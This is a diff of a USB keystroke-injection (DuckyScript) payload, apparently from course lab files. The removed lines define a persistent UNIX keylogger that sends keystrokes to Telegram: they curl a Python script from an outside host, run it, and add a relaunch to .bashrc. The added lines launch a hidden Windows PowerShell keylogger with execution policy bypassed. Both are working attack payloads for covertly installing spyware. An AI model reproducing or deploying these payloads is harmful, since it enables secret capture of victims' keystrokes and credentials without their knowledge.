@@ -1,16 +1,6 @@
-REM Persistent Keylogger that sends to Telegram on UNIX machines
-REM Target: UNIX
-
-REM Requirements: internet connection
-REM put link to script
-DEFINE #PYTHON_SCRIPT-LINK https://github.com/butlersl/305-lab-files/blob/main/Keylogger/connection.py
-
-DELAY 1000
-CTRL-ALT t
-DELAY 2000
-
-STRINGLN_BLOCK
-	curl -o connection.py #PYTHON-SCRIPT-LINK; python3 connection.py; echo "if ! pgrep -f connection.py >/dev/null; then
-  python3 connection.py & 
-  fi" >> .bashrc; exit
-END_STRINGLN
+DELAY 1500
+GUI r
+DELAY 600
+STRING powershell -WindowStyle Hidden -Command "Start-Process powershell -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -File keylogger.ps1' -WindowStyle Hidden; Start-Sleep 1; exit"
+DELAY 400
+ENTER
